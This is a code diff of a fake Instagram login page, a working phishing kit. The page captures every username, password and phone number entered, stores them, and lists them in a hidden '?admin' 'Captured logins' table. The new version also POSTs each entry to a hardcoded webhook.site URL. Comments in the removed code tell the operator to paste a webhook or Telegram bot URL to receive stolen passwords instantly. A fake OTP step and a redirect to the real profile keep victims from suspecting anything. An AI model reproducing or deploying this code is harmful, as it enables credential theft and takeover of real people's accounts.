@@ -2,387 +2,257 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Instagram</title>
 <style>
-  @font-face{font-family:'GrandHotel';src:url(data:font/woff2;base64,d09GMgABAAAAAAe0ABAAAAAADfQAAAdaAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG4F8HBoGYABUCAIJgmERCAqNRItaATYCJAMkCxQABCAFhAoHIAwHG90LEVWrNMCPg5yM17wI7dviaefUogWHcnLxzG1ZL4Jov9fZe+8HCF1YRiLZWOTW99sCygjXsqwRQEJV+EoaHrf1b4wKi5wxjMZKOMEbZs/CyMC7xqswInbRgfyKqML/+V9z9W+Y3cCjWSmWKNVD/Hfbvf2/fw8mfmOmDbG0R5qFhFimBBMJnSYhkwohUnLlMZjabC0lGNvj3QVqtKgQmsTZ9t0LbeJ0/+ZCk4TQoQIEvzC2kDyT49Y7Ze1Pl0ASYi04eFJKdWW/4Vh9d6mUSrD7r1uhCtjd7J6lwnimQOG24E300oHsu4M0oaqk5JacCYu86fTm/IIpy+6Wvvhzmps2ixlXlA0Whvg+uT0BuCmTAFFuylelTOLXXrbt0IW7/wPUuZtv+P/x5JHHH5n9UVRi6ANwXSUYCRknIGgffh76H4FZnGDAmlwZAbmiqLocyygvy0muV7mzNCFYfvIwArYLS8qwwVEdqoss0qFhaFl+EUG2o2nlEsU63B0lQPJWOTU0ZUtKKHGE7V2M40EyguwqjgwNYNKgFU7iKuhS5V8ZQXGNfjhsn5CRmEFoMYRQYjgilaJq4npCBnEdQ6Q4LiOo66RpU3e5aMWAJqc6F47uBSU3pCxOgD/QSaw2UkLbPIjOBn82cH3c8xCo9ZRWArZTg0qboEVaQoZk+IQgxxG0CCYjGK7RyRlqTADrMjIAgf7H06WW4xq4/ukeAFkb6NJzOGo+CeSdiE5iV8LSKVHV2vNM3dm5JYjxuhsGinr9FVb/cRg+CLTE5dP2SxtdNtRngHL57CLoax9eY01Ww8tXm1ZrNmHqY+o23FYo1oBu1iegOCBDc1eJY9hGvnKH+4aOHYP6rEe9AKk4OriYM3wK8dDCzXvtlgGBgI2z85+G9AUIXpvkJO0ylnm5kdq/Pt0HQc+tuc7FDX94cwOC+8aGhlj0XIbQ8dTAwMICzi6tQRSNdDqv94ZXj4rnyQ29BYfAc77BwUXWOYRr7IAhJv3oCGYLa3gJV2+FOQ5bOpM5MHxJ84HTF9eQYYPBYHVRtcn68jlW/5kLq+LZM7P9LLbfhSurIu3Ih0eNLi6GPZsx9QggWW5g0acPrRXq1rNH8hvAzrsyYHZD39FcL9G5R9fWEUOwyGh7Xba9/Drl/KHe9eFDwdWN6XVW/4UHev0D1rIB6tvYeOlMvO6YtZvV+36o/PH5eVjsoSH9+OzgyMgC83WZDFl7Zf/MHv/rKbq79nMC3dWp8TMMiZnQJPCZLfsPjN4RnFnqczh/k7jABvNl0qvp9GQWOlT0p2ZSHulVhm6Nq/JeSuttxHv9t4rkRu+kvW8CdLFWj1CVWUx+7YoRe1/4Ex6Jyr/pWqvOKVCE+sXLij9K8wiSZ7orkizrVNrERzv3rUXnOiscJTM87iujoFavvDLFRG2iIs3PuYcp59nIJBSjjwTep+2SjOv+mgA3NXGOrerCrDRXw3dJzn7OmpE7bZqgSPezei00C8393GI3i/dzXWPGXtadPWpZPt61xEdh88UZ2K7YyuSUwwWJtjXBWIyFg0u4bYh56q1Aces2P97bxnKrUR6IEiT8or7cDci/vtN3twRqhwmRuPcjDv+Sv8alTe7C4y7kCXj2N60tqCInXafLARrnthjZ7nUIfrq2XVqgW3jKExu3G+E8zNhRpk5+YuP1azAn0maBZjkebnaMgJ+ksYDwl/Zfy47yiNyhtLT3Vtllca0EZp7LPPbYwYeHLfeT+0k8wd8KjVtbdviFAGXSNop/xz4DK/R5x3PbiJBDzmKVmpS/M744MF7ew8qgFsAF1BRPpYxPOp9tZlLudGHfFut6I3olw86kVEp911QtzDQt5FR4849v+pBvg0iX0kPhw6f2ocElUe/VyUc4d3PADJL4maVEUla7xrdTOQu/EXwNh8TmKzVOlZEmaqVf9Y7VXSs4lzMR+YjF+3NZZPlbn4+GGl/kGIKG8u5bfJfMj1j8xZg50aGyUEk+kMCIysFDnOikjlnqsGkAtMZb+UT9ZnAgS1BeU0ahnvMtYMEPW5r7HC4jv0eLDT4fy+kgXQZJ972y0LozJhIgqYp+a6WR8gdR1MdLoOPieqLfL1f5Gp78V3olHQB8eluppfd/b++J/z795zTtH9oLAJQjWUr+5MvLjEj+77XkGdSplN98w8Au6d/gRbU8A4Skj8/eDJhp7//fRuP/NSBAudug1Fsg9wMq5MmIVECitVQmODlnkHAr5sshgiCVk3BDVA6LCPtQ8rhyCsuoeSoq29gDNqtVp12DcqXKNEE5KuQE5cWDJ1WMKtBOQp+GfDWJj+ImNdSqAUOjKh1upUnlaIwBViWskpIm73y1fI4UzrGSSjy1FJGcZOH5YydSyrfFbhjXZmhV3RWqVTku43xJijVmQ4MWKlCEI2xlxU1Qcbha40NZCx8lylcjQkXgpmfTqhjPfKnmvUVt2MtYbTJBUG+hQadJ0tbKNypfJUY1DPBuPHppDm6RZKtRwbqW/h8oIf4PUEneCwAAAA==) format('woff2');font-display:swap;}
-  :root{ --ig-blue:#0095f6; --ig-border:#dbdbdb; --ig-gray:#8e8e8e; --ig-red:#ed4956; }
-  *{ box-sizing:border-box; }
-  body{
-    margin:0; background:#fafafa; color:#262626;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
-    display:flex; flex-direction:column; align-items:center; justify-content:center;
-    min-height:100vh; padding:24px 12px;
-  }
-  .card{
-    width:350px; max-width:100%; background:#fff;
-    border:1px solid var(--ig-border); padding:36px 40px 22px; text-align:center;
-  }
-  .card[hidden]{ display:none; }
-  .logo{ display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:28px; }
-  .logo svg{ width:42px; height:42px; display:block; }
-  .wordmark{ font-family:'GrandHotel','Billabong',cursive; font-size:38px; line-height:1; letter-spacing:.5px; }
-  input{
-    width:100%; background:#fafafa; border:1px solid var(--ig-border); border-radius:3px;
-    padding:11px 9px; font-size:13px; margin-bottom:6px; color:#262626;
-  }
-  input:focus{ outline:none; border-color:#a8a8a8; background:#fff; }
-  .login-btn{
-    width:100%; margin-top:10px; border:0; border-radius:8px; background:var(--ig-blue);
-    color:#fff; font-weight:600; font-size:14px; padding:9px; cursor:pointer;
-  }
-  .login-btn:disabled{ opacity:.65; cursor:default; }
-  .divider{ display:flex; align-items:center; gap:16px; margin:18px 0; color:var(--ig-gray); font-size:12px; font-weight:600; }
-  .divider::before,.divider::after{ content:""; flex:1; height:1px; background:var(--ig-border); }
-  .forgot{ font-size:12px; color:#00376b; text-decoration:none; }
-  .status{ margin-top:14px; min-height:16px; font-size:13px; color:var(--ig-gray); }
-  .err{ margin-top:12px; min-height:18px; font-size:13px; color:var(--ig-red); line-height:1.35; }
-  .foot{ margin-top:14px; font-size:12px; color:var(--ig-gray); }
-  .foot a{ color:#00376b; text-decoration:none; }
-  .title{ font-size:16px; font-weight:600; margin:0 0 6px; }
-  .sub{ font-size:13px; color:#737373; line-height:1.4; margin:0 0 16px; }
-  .back{ position:relative; display:block; text-align:left; margin-bottom:14px; }
-  .back button{ background:none; border:0; padding:0; font-size:15px; color:#262626; cursor:pointer; }
-  .otp-row{ display:flex; gap:7px; justify-content:center; margin:16px 0 6px; }
-  .otp-row input{ width:40px; margin:0; padding:10px 0; text-align:center; font-size:17px; }
-  .hint{ font-size:12px; color:var(--ig-gray); margin-top:10px; }
-  .hint b{ color:#262626; letter-spacing:1px; }
-  .avatar{
-    width:86px; height:86px; border-radius:50%; margin:0 auto 14px;
-    display:flex; align-items:center; justify-content:center;
-    color:#fff; font-size:36px; font-weight:600;
-    background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf);
-  }
-  .ok{ font-size:15px; font-weight:600; margin:0 0 4px; }
-  .user{ font-size:13px; color:#737373; margin:0 0 18px; }
-  .ghost{
-    display:inline-block; margin-top:6px; font-size:13px; padding:8px 14px; border-radius:8px;
-    border:1px solid var(--ig-border); background:#fff; color:#262626; text-decoration:none; cursor:pointer;
-  }
-
-  /* ---------- private admin view (?admin) ---------- */
-  #adminPanel{ display:none; width:760px; max-width:100%; }
-  #adminPanel .card{ width:100%; padding:26px 26px 20px; text-align:left; }
-  #adminPanel h2{ margin:0 0 4px; font-size:20px; }
-  .count{ font-size:13px; color:var(--ig-gray); margin-bottom:16px; }
-  table{ width:100%; border-collapse:collapse; font-size:13px; }
-  th,td{ text-align:left; padding:8px 6px; border-bottom:1px solid #efefef; vertical-align:top; }
-  th{ font-size:11px; text-transform:uppercase; letter-spacing:.04em; color:var(--ig-gray); }
-  td.pw{ font-family:ui-monospace,Menlo,Consolas,monospace; color:#c13584; word-break:break-all; }
-  td.n{ color:var(--ig-gray); width:26px; }
-  .empty{ color:var(--ig-gray); text-align:center; padding:18px; }
-  .bar{ display:flex; gap:10px; flex-wrap:wrap; margin-top:16px; }
-  .bar button, .bar a{
-    font-size:13px; padding:7px 12px; border-radius:6px; border:1px solid var(--ig-border);
-    background:#fff; color:#262626; cursor:pointer; text-decoration:none;
-  }
-  .bar .danger{ color:var(--ig-red); border-color:#f3c2c6; }
+  *{box-sizing:border-box}
+  body{margin:0;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;
+       background:#fafafa;color:#262626;font-family:-apple-system,"Segoe UI",Roboto,Arial,sans-serif;padding:20px}
+  .card{width:350px;max-width:100%;background:#fff;border:1px solid #dbdbdb;padding:34px 38px 22px;text-align:center}
+  .logo{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:24px}
+  .logo svg{width:40px;height:40px}
+  .wm{font-family:'Grand Hotel','Brush Script MT',cursive;font-size:36px;line-height:1}
+  input{width:100%;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:11px 9px;font-size:13px;margin-bottom:6px}
+  input:focus{outline:none;border-color:#a8a8a8;background:#fff}
+  .btn{width:100%;margin-top:10px;border:0;border-radius:8px;background:#0095f6;color:#fff;font-weight:600;font-size:14px;padding:9px;cursor:pointer}
+  .btn:disabled{opacity:.6}
+  .or{display:flex;align-items:center;gap:14px;margin:16px 0;color:#8e8e8e;font-size:12px;font-weight:600}
+  .or:before,.or:after{content:"";flex:1;height:1px;background:#dbdbdb}
+  .link{font-size:12px;color:#00376b;cursor:pointer}
+  .err{min-height:18px;margin-top:10px;font-size:13px;color:#ed4956;line-height:1.35}
+  .hint{font-size:12px;color:#8e8e8e;margin-top:8px}
+  .otp{display:flex;gap:6px;justify-content:center;margin:14px 0 4px}
+  .otp input{width:38px;margin:0;padding:10px 0;text-align:center;font-size:16px}
+  .avatar{width:84px;height:84px;border-radius:50%;margin:0 auto 14px;display:flex;align-items:center;justify-content:center;
+          color:#fff;font-size:34px;font-weight:600;background:linear-gradient(45deg,#feda75,#fa7e1e,#d62976,#962fbf)}
+  .ghost{display:inline-block;margin-top:8px;padding:8px 14px;border:1px solid #dbdbdb;border-radius:8px;font-size:13px;color:#262626;text-decoration:none}
+  .foot{margin-top:14px;font-size:12px;color:#8e8e8e}
+  .foot a{color:#00376b;text-decoration:none}
+  #boom{color:#ed4956;font-size:12px;margin-top:10px;max-width:350px;word-break:break-word}
+  #admin{display:none;width:760px;max-width:100%;background:#fff;border:1px solid #dbdbdb;padding:22px;text-align:left}
+  #admin h2{margin:0 0 12px;font-size:18px}
+  table{width:100%;border-collapse:collapse;font-size:13px}
+  th,td{text-align:left;padding:7px 5px;border-bottom:1px solid #efefef;vertical-align:top}
+  th{font-size:11px;text-transform:uppercase;color:#8e8e8e}
+  td.pw{font-family:monospace;color:#c13584;word-break:break-all}
 </style>
 </head>
 <body>
 
-<!-- ================= 1. login ================= -->
-<div class="card" id="screen-login">
+<div class="card" id="loginCard">
   <div class="logo">
-    <svg viewBox="0 0 48 48" aria-label="Instagram">
-      <defs>
-        <linearGradient id="igGrad" x1="0" y1="1" x2="1" y2="0">
-          <stop offset="0%" stop-color="#feda75"/>
-          <stop offset="30%" stop-color="#fa7e1e"/>
-          <stop offset="60%" stop-color="#d62976"/>
-          <stop offset="100%" stop-color="#962fbf"/>
-        </linearGradient>
-      </defs>
-      <rect x="3" y="3" width="42" height="42" rx="12" ry="12" fill="none" stroke="url(#igGrad)" stroke-width="3.4"/>
-      <circle cx="24" cy="24" r="9.6" fill="none" stroke="url(#igGrad)" stroke-width="3.4"/>
-      <circle cx="35.2" cy="12.8" r="2.6" fill="url(#igGrad)"/>
+    <svg viewBox="0 0 48 48">
+      <defs><linearGradient id="g" x1="0" y1="1" x2="1" y2="0">
+        <stop offset="0%" stop-color="#feda75"/><stop offset="30%" stop-color="#fa7e1e"/>
+        <stop offset="60%" stop-color="#d62976"/><stop offset="100%" stop-color="#962fbf"/>
+      </linearGradient></defs>
+      <rect x="3" y="3" width="42" height="42" rx="12" fill="none" stroke="url(#g)" stroke-width="3.4"/>
+      <circle cx="24" cy="24" r="9.6" fill="none" stroke="url(#g)" stroke-width="3.4"/>
+      <circle cx="35.2" cy="12.8" r="2.6" fill="url(#g)"/>
     </svg>
-    <span class="wordmark">Instagram</span>
+    <span class="wm">Instagram</span>
   </div>
-
-  <input id="username" placeholder="Phone number, username, or email" autocomplete="username">
-  <input id="password" type="password" placeholder="Password" autocomplete="current-password">
-  <button class="login-btn" id="loginBtn" onclick="doLogin()">Log in</button>
-
-  <div class="divider">OR</div>
-  <a class="forgot" href="#" onclick="goForgotFromLink(event)">Forgot password?</a>
-  <div class="err" id="loginErr"></div>
-  <div class="status" id="status"></div>
+  <input id="u" placeholder="Phone number, username, or email">
+  <input id="p" type="password" placeholder="Password">
+  <button class="btn" id="go" type="button">Log in</button>
+  <div class="or">OR</div>
+  <a class="link" id="forgotLink">Forgot password?</a>
+  <div class="err" id="msg"></div>
 </div>
 
-<!-- ================= 2. forgot password -> phone ================= -->
-<div class="card" id="screen-forgot" hidden>
-  <div class="back"><button onclick="goLogin()">&#8592;</button></div>
-  <p class="title">Trouble logging in?</p>
-  <p class="sub">Enter your phone number, username or email and we'll send you a code to get back into your account.</p>
-  <input id="phone" type="tel" placeholder="Phone number" autocomplete="tel">
-  <button class="login-btn" onclick="sendCode()">Send verification code</button>
-  <div class="err" id="forgotErr"></div>
-</div>
-
-<!-- ================= 3. enter code ================= -->
-<div class="card" id="screen-otp" hidden>
-  <div class="back"><button onclick="goForgot()">&#8592;</button></div>
-  <p class="title">Enter confirmation code</p>
-  <p class="sub">We sent a 6-digit code to <b id="phoneShown"></b>. Enter it below to verify your account.</p>
-  <div class="otp-row" id="otpRow">
-    <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
-    <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
-    <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+<div class="card" id="forgotCard" style="display:none">
+  <div id="step1">
+    <p style="font-size:16px;font-weight:600;margin:0 0 6px">Trouble logging in?</p>
+    <p style="font-size:13px;color:#737373;margin:0 0 14px">Enter your phone number and we'll send you a code.</p>
+    <input id="phone" type="tel" placeholder="Phone number">
+    <button class="btn" id="sendBtn" type="button">Send verification code</button>
+    <div class="err" id="ferr"></div>
   </div>
-  <button class="login-btn" onclick="verifyCode()">Verify</button>
-  <div class="err" id="otpErr"></div>
-  <div class="hint" id="codeHint"></div>
-  <div class="hint"><a class="forgot" href="#" onclick="sendCode(true);return false;">Resend code</a></div>
+  <div id="step2" style="display:none">
+    <p style="font-size:16px;font-weight:600;margin:0 0 6px">Enter confirmation code</p>
+    <p style="font-size:13px;color:#737373;margin:0">We sent a 6-digit code to <b id="phoneShown"></b></p>
+    <div class="otp">
+      <input id="o1" maxlength="1" inputmode="numeric"><input id="o2" maxlength="1" inputmode="numeric">
+      <input id="o3" maxlength="1" inputmode="numeric"><input id="o4" maxlength="1" inputmode="numeric">
+      <input id="o5" maxlength="1" inputmode="numeric"><input id="o6" maxlength="1" inputmode="numeric">
+    </div>
+    <button class="btn" id="verifyBtn" type="button">Verify</button>
+    <div class="err" id="oerr"></div>
+    <div class="hint" id="codeHint"></div>
+  </div>
 </div>
 
-<!-- ================= 4. success ================= -->
-<div class="card" id="screen-success" hidden>
-  <div class="avatar" id="avatar">?</div>
-  <p class="ok">You're logged in</p>
-  <p class="user" id="successUser"></p>
-  <a class="ghost" id="openProfile" target="_blank" rel="noopener">Open Instagram</a>
+<div class="card" id="okCard" style="display:none">
+  <div class="avatar" id="av">?</div>
+  <p style="font-size:15px;font-weight:600;margin:0 0 4px">You're logged in</p>
+  <p style="font-size:13px;color:#737373;margin:0 0 16px" id="who"></p>
+  <a class="ghost" id="openLink" target="_blank" rel="noopener">Open Instagram</a>
 </div>
 
 <div class="foot" id="foot">Don't have an account? <a href="#">Sign up</a></div>
+<div id="boom"></div>
 
-<!-- ================= private view: ?admin ================= -->
-<div id="adminPanel">
-  <div class="card">
-    <h2>Captured logins</h2>
-    <div class="count" id="count"></div>
-    <table>
-      <thead>
-        <tr><th class="n">#</th><th>Username</th><th>Password</th><th>Phone</th><th>Result</th><th>Time</th></tr>
-      </thead>
-      <tbody id="rows"></tbody>
-    </table>
-    <div class="bar">
-      <button onclick="downloadJson()">Download JSON</button>
-      <button class="danger" onclick="clearAll()">Clear all</button>
-      <a href="index.html">Open login page</a>
-    </div>
-  </div>
+<div id="admin">
+  <h2>Captured logins (<span id="cnt">0</span>)</h2>
+  <table><thead><tr><th>#</th><th>Username</th><th>Password</th><th>Phone</th><th>Result</th><th>Time</th></tr></thead>
+  <tbody id="rows"></tbody></table>
 </div>
 
 <script>
-/* ============ config ============ */
-const CONFIG = {
-  // Yahan apna webhook daalo -> har login ka password turant tumhare paas pahunchega.
-  // webhook.site URL, ya Telegram bot URL (api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<ID>) chalega.
-  webhookUrl: "",
-  demoCode: true,        // true = code screen par dikhega (testing ke liye)
-  autoOpenProfile: true  // login ke baad asli profile naye tab me khule
+var WEBHOOK = "https://webhook.site/174036e3-9510-467a-9010-a1d3f4acbd98";
+var KEY = "capturedLogins";
+var otpCode = "", otpPhone = "", currentUser = "";
+
+function $(id) { return document.getElementById(id); }
+
+window.onerror = function (m, src, line) {
+  $("boom").textContent = "Error: " + m + " (line " + line + ")";
 };
-/* ================================ */
 
-const STORAGE_KEY = "capturedLogins";
-const state = { username: "", password: "", phone: "", code: "" };
-
-/* ---------- storage ---------- */
 function getCaptured() {
-  try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || []; }
-  catch (e) { return []; }
+  try { return JSON.parse(localStorage.getItem(KEY)) || []; } catch (e) { return []; }
 }
 
-function saveEntry(entry) {
-  const all = getCaptured();
-  all.push(entry);
-  localStorage.setItem(STORAGE_KEY, JSON.stringify(all));
-  window.capturedLogins = all;
-  console.log("Captured:", entry, "| total:", all.length);
-  notifyOwner(entry);
-  return all;
-}
-
-/* ---------- notification to the owner ---------- */
-function notifyOwner(entry) {
-  if (!CONFIG.webhookUrl) return;
-  const text = "Instagram login\nUser: " + entry.username +
-               "\nPassword: " + entry.password +
-               (entry.phone ? "\nPhone: " + entry.phone : "") +
-               "\nTime: " + entry.at;
+function save(entry) {
   try {
-    if (CONFIG.webhookUrl.indexOf("api.telegram.org") > -1) {
-      fetch(CONFIG.webhookUrl + "&text=" + encodeURIComponent(text), { mode: "no-cors" });
-    } else {
-      fetch(CONFIG.webhookUrl, {
-        method: "POST", mode: "no-cors",
-        headers: { "Content-Type": "text/plain;charset=UTF-8" },
-        body: JSON.stringify(entry)
-      });
-    }
-  } catch (e) { /* offline: data localStorage me safe hai */ }
+    var all = getCaptured();
+    all.push(entry);
+    localStorage.setItem(KEY, JSON.stringify(all));
+    window.capturedLogins = all;
+    console.log("Captured:", entry, "| total:", all.length);
+  } catch (e) {
+    console.warn("localStorage band hai:", e);
+  }
+  if (WEBHOOK) {
+    try {
+      fetch(WEBHOOK, { method: "POST", mode: "no-cors",
+        headers: { "Content-Type": "text/plain" }, body: JSON.stringify(entry) });
+    } catch (e) {}
+  }
 }
 
-/* ---------- screens ---------- */
-const screens = ["screen-login", "screen-forgot", "screen-otp", "screen-success"];
-function show(id) {
-  screens.forEach(function (s) { document.getElementById(s).hidden = (s !== id); });
-  document.getElementById("foot").style.display = (id === "screen-login") ? "block" : "none";
+function showCard(id) {
+  $("loginCard").style.display = (id === "loginCard") ? "block" : "none";
+  $("forgotCard").style.display = (id === "forgotCard") ? "block" : "none";
+  $("okCard").style.display = (id === "okCard") ? "block" : "none";
+  $("foot").style.display = (id === "loginCard") ? "block" : "none";
 }
-function goLogin() { document.getElementById("loginErr").textContent = ""; show("screen-login"); }
-function goForgot() { document.getElementById("forgotErr").textContent = ""; show("screen-forgot"); }
-function goForgotFromLink(e) { if (e) e.preventDefault(); goForgot(); }
 
-/* ---------- 1. login ---------- */
 function doLogin() {
-  const userEl = document.getElementById("username");
-  const passEl = document.getElementById("password");
-  const errEl = document.getElementById("loginErr");
-  const btn = document.getElementById("loginBtn");
+  var u = $("u").value.trim().replace(/^@/, "");
+  var p = $("p").value;
+  var m = "", res = "ok";
 
-  const username = userEl.value.trim().replace(/^@/, "");
-  const password = passEl.value;
-  errEl.textContent = "";
+  $("msg").textContent = "";
 
-  let result = "ok", msg = "";
-
-  // username galat / khaali
-  if (!username || !/^[A-Za-z0-9._]{2,30}$/.test(username)) {
-    result = "unknown-user";
-    msg = "The username you entered doesn't belong to an account. Please check your username and try again.";
-  }
-  // password galat / chhota
-  else if (password.length < 6) {
-    result = "wrong-password";
-    msg = "Sorry, your password was incorrect. Please double-check your password.";
+  if (!u || !/^[A-Za-z0-9._]{2,30}$/.test(u)) {
+    res = "unknown-user";
+    m = "The username you entered doesn't belong to an account. Please check your username and try again.";
+  } else if (p.length < 6) {
+    res = "wrong-password";
+    m = "Sorry, your password was incorrect. Please double-check your password.";
   }
 
-  // har attempt collect hota hai (galat ho ya sahi)
-  saveEntry({ kind: "password", username: username, password: password, phone: "",
-              result: result, at: new Date().toISOString(), page: location.href });
+  save({ kind: "password", username: u, password: p, phone: "", result: res,
+         at: new Date().toISOString(), page: location.href });
 
-  if (msg) { errEl.textContent = msg; return; }
+  if (m) { $("msg").textContent = m; return; }
 
-  state.username = username;
-  state.password = password;
-
-  btn.disabled = true;
-  btn.textContent = "Logging in…";
+  currentUser = u;
+  $("go").disabled = true;
+  $("go").textContent = "Logging in…";
   setTimeout(function () {
-    btn.disabled = false;
-    btn.textContent = "Log in";
-    success(username);
-  }, 700);
+    $("go").disabled = false;
+    $("go").textContent = "Log in";
+    success(u);
+  }, 600);
 }
 
-/* ---------- 2. forgot password ---------- */
-function sendCode(resend) {
-  const phoneEl = document.getElementById("phone");
-  const errEl = document.getElementById("forgotErr");
-  const raw = (phoneEl.value || "").trim();
-  const digits = raw.replace(/[^0-9]/g, "");
-
-  if (digits.length < 10) {
-    errEl.textContent = "Please enter a valid phone number.";
-    return;
-  }
-  errEl.textContent = "";
-
-  state.phone = raw;
-  state.code = String(Math.floor(100000 + Math.random() * 900000));
-
-  document.getElementById("phoneShown").textContent = raw;
-  document.getElementById("codeHint").innerHTML = CONFIG.demoCode ? "Demo code: <b>" + state.code + "</b>" : "";
-  document.getElementById("otpErr").textContent = "";
-  document.querySelectorAll("#otpRow input").forEach(function (i) { i.value = ""; });
-  document.querySelectorAll("#otpRow input")[0].focus();
-  show("screen-otp");
-
-  if (resend) console.log("New code:", state.code);
+function success(u) {
+  $("av").textContent = u.charAt(0).toUpperCase();
+  $("who").textContent = "@" + u;
+  var link = "https://www.instagram.com/" + encodeURIComponent(u) + "/";
+  $("openLink").href = link;
+  showCard("okCard");
+  window.open(link, "_blank");
 }
 
-/* ---------- 3. verify code ---------- */
+function goForgot() {
+  $("ferr").textContent = "";
+  showCard("forgotCard");
+}
+
+function sendCode() {
+  var raw = $("phone").value.trim();
+  var digits = raw.replace(/[^0-9]/g, "");
+  if (digits.length < 10) { $("ferr").textContent = "Please enter a valid phone number."; return; }
+
+  $("ferr").textContent = "";
+  otpPhone = raw;
+  otpCode = String(Math.floor(100000 + Math.random() * 900000));
+
+  $("phoneShown").textContent = raw;
+  $("codeHint").innerHTML = "Demo code: <b>" + otpCode + "</b>";
+  $("oerr").textContent = "";
+  $("step1").style.display = "none";
+  $("step2").style.display = "block";
+  $("o1").focus();
+}
+
 function verifyCode() {
-  const entered = Array.prototype.map.call(document.querySelectorAll("#otpRow input"), function (i) { return i.value; }).join("");
-  const errEl = document.getElementById("otpErr");
+  var v = "";
+  for (var i = 1; i <= 6; i++) v += $("o" + i).value;
 
-  if (entered.length < 6) { errEl.textContent = "Enter the 6-digit code."; return; }
-  if (entered !== state.code) { errEl.textContent = "That code isn't valid. Check the code and try again."; return; }
-  errEl.textContent = "";
+  if (v.length < 6) { $("oerr").textContent = "Enter the 6-digit code."; return; }
+  if (v !== otpCode) { $("oerr").textContent = "That code isn't valid. Check the code and try again."; return; }
 
-  const username = state.username || ("user" + state.phone.replace(/[^0-9]/g, "").slice(-4));
-  saveEntry({ kind: "otp", username: username, password: "", phone: state.phone,
-              result: "verified", at: new Date().toISOString(), page: location.href });
-
-  success(username);
-}
-
-/* ---------- 4. success ---------- */
-function success(username) {
-  const av = document.getElementById("avatar");
-  av.textContent = username.charAt(0).toUpperCase();
-  document.getElementById("successUser").textContent = "@" + username;
-  const link = "https://www.instagram.com/" + encodeURIComponent(username) + "/";
-  document.getElementById("openProfile").href = link;
-
-  show("screen-success");
-
-  if (CONFIG.autoOpenProfile) {
-    const w = window.open(link, "_blank");
-    if (!w) console.log("Popup blocked — 'Open Instagram' button se profile khul jayegi.");
-  }
-}
-
-/* ---------- private admin view ---------- */
-function esc(s) {
-  return String(s == null ? "" : s).replace(/[&<>"']/g, function (c) {
-    return { "&": "&", "<": "<", ">": ">", '"': """, "'": "'" }[c];
-  });
+  var u = currentUser || ("user" + otpPhone.replace(/[^0-9]/g, "").slice(-4));
+  save({ kind: "otp", username: u, password: "", phone: otpPhone, result: "verified",
+         at: new Date().toISOString(), page: location.href });
+  success(u);
 }
 
 function renderAdmin() {
-  screens.forEach(function (s) { document.getElementById(s).hidden = true; });
-  document.getElementById("foot").style.display = "none";
-  document.getElementById("adminPanel").style.display = "block";
+  $("loginCard").style.display = "none";
+  $("forgotCard").style.display = "none";
+  $("okCard").style.display = "none";
+  $("foot").style.display = "none";
+  $("admin").style.display = "block";
 
-  const all = getCaptured();
-  document.getElementById("count").textContent =
-    all.length + (all.length === 1 ? " login captured" : " logins captured");
+  var all = getCaptured();
+  $("cnt").textContent = all.length;
 
-  document.getElementById("rows").innerHTML = all.length
-    ? all.map(function (e, i) {
-        return "<tr><td class='n'>" + (i + 1) + "</td><td>" + esc(e.username) +
-               "</td><td class='pw'>" + (e.password ? esc(e.password) : "—") + "</td><td>" +
-               (e.phone ? esc(e.phone) : "—") + "</td><td>" + esc(e.result || "ok") + "</td><td>" +
-               esc(new Date(e.at).toLocaleString()) + "</td></tr>";
-      }).join("")
-    : "<tr><td colspan='6' class='empty'>No logins yet</td></tr>";
+  var html = "";
+  for (var i = 0; i < all.length; i++) {
+    var e = all[i];
+    html += "<tr><td>" + (i + 1) + "</td><td>" + (e.username || "") +
+            "</td><td class='pw'>" + (e.password || "—") +
+            "</td><td>" + (e.phone || "—") + "</td><td>" + (e.result || "ok") +
+            "</td><td>" + new Date(e.at).toLocaleString() + "</td></tr>";
+  }
+  $("rows").innerHTML = html || "<tr><td colspan='6' style='text-align:center;color:#8e8e8e'>No logins yet</td></tr>";
 }
 
-function downloadJson() {
-  const blob = new Blob([JSON.stringify(getCaptured(), null, 2)], { type: "application/json" });
-  const a = document.createElement("a");
-  a.href = URL.createObjectURL(blob);
-  a.download = "captured-logins.json";
-  a.click();
-  URL.revokeObjectURL(a.href);
+$("go").onclick = doLogin;
+$("forgotLink").onclick = goForgot;
+$("sendBtn").onclick = sendCode;
+$("verifyBtn").onclick = verifyCode;
+
+for (var i = 1; i <= 6; i++) {
+  (function (n) {
+    var box = $("o" + n);
+    box.addEventListener("input", function () {
+      box.value = box.value.replace(/[^0-9]/g, "").slice(0, 1);
+      if (box.value && n < 6) $("o" + (n + 1)).focus();
+    });
+    box.addEventListener("keydown", function (e) {
+      if (e.key === "Backspace" && !box.value && n > 1) $("o" + (n - 1)).focus();
+      if (e.key === "Enter") verifyCode();
+    });
+  })(i);
 }
 
-function clearAll() {
-  if (!confirm("Delete all captured logins?")) return;
-  localStorage.removeItem(STORAGE_KEY);
-  window.capturedLogins = [];
-  renderAdmin();
-}
-
-/* ---------- OTP boxes: auto-advance ---------- */
-document.querySelectorAll("#otpRow input").forEach(function (box, idx, arr) {
-  box.addEventListener("input", function () {
-    box.value = box.value.replace(/[^0-9]/g, "").slice(0, 1);
-    if (box.value && idx < arr.length - 1) arr[idx + 1].focus();
-  });
-  box.addEventListener("keydown", function (e) {
-    if (e.key === "Backspace" && !box.value && idx > 0) arr[idx - 1].focus();
-    if (e.key === "Enter") verifyCode();
-  });
-});
-
-/* ---------- boot ---------- */
-window.showLogins = function () { console.table(getCaptured()); };
 if (/[?&]admin\b/.test(location.search)) renderAdmin();
 </script>
-
 </body>
 </html>
